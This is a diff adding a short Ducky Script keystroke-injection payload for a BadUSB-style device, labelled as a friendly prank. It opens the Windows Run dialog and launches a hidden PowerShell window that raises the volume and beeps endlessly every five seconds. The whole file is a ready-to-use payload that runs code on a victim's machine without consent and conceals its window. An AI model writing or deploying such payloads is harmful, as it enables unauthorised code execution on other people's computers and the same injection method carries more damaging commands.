@@ -1,0 +1,9 @@
+REM ============================================
+REM Max Volume + Annoying Beep
+REM FOR FRIENDLY PRANKS ONLY
+REM ============================================
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -Command "(New-Object -COM WScript.Shell).SendKeys([char]175);Start-Sleep -Milliseconds 200;(New-Object -COM WScript.Shell).SendKeys([char]175);Start-Sleep -Milliseconds 200;(New-Object -COM WScript.Shell).SendKeys([char]175);while($true){[Console]::Beep(2000,500);Start-Sleep -Seconds 5}"
